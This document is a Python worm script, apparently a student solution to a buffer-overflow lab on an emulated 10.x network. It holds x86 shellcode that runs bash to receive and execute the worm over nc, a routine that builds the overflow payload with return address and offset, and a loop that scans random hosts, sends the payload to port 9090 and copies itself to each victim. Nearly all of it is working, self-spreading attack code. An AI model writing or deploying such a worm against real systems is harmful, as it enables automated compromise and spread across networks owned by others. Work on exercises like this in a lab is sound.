#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint
from random import random
import socket
# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   "if [[ ! -f worm.py ]]; then                                 "
   " nc -lnv 9000 > worm.py; chmod +x worm.py; ./worm.py;fi;    "
   "                                                            "
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 +0x10 # Need to change
   offset = 116  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   x=randint(151,153)
   y=randint(71,75)
   return "10."+str(x)+".0."+str(y)


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
#subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)


# Create the badfile 
createBadfile()
s=socket.socket()
host=socket.gethostname()
s.bind((host,7000))
s.listen(5)
# Launch the attack on other servers
while True:
    host=socket.gethostname()
    targetIP = getNextTarget()
    while targetIP=="10.151.0.72":
    	targetIP = getNextTarget()
    output = subprocess.check_output(f"ping -q -c1 -W1 {targetIP}", shell=True)
    result = output.find(b'1 received')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result2 = sock.connect_ex((targetIP,7000))
    if result!=-1 and result2!=0:

    	# Send the malicious payload to the target host
    	print(f"**********************************", flush=True)
    	print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    	print(f"**********************************", flush=True)
    	subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
    	time.sleep(5) 
    	subprocess.run([f"cat worm.py | nc -w5 {targetIP} 9000"], shell=True)
    	# Give the shellcode some time to run on the target host
    	time.sleep(11)
    else:
    	print(f"{targetIP} already infected", flush=True)
    	time.sleep(11)
    # Remove this line if you want to continue attacking others
    